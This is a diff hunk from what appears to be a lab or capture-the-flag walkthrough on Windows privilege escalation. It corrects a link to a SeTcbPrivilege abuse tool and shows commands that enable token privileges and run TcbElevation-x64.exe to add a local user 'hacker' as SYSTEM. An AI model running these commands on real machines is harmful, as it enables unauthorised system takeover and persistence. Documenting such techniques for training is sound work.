@@ -286,7 +286,7 @@ Import-Module EnableAllTokenPrivs.ps1
 
 ![](Assets/2026-08-15_00-44.png)
 
-With that enabled, I use [TcbElevation-x64.exe](![](../../2026-08-15_00-55%201.png)) - which leverages `SeTcbPrivilege` to impersonate SYSTEM. First, I add a new user:
+With that enabled, I use [TcbElevation-x64.exe](https://github.com/b4lisong/SeTcbPrivilege-Abuse) - which leverages `SeTcbPrivilege` to impersonate SYSTEM. First, I add a new user:
 
 ```
 ./TcbElevation-x64.exe svc_add "cmd /c net user hacker pass123 /add"
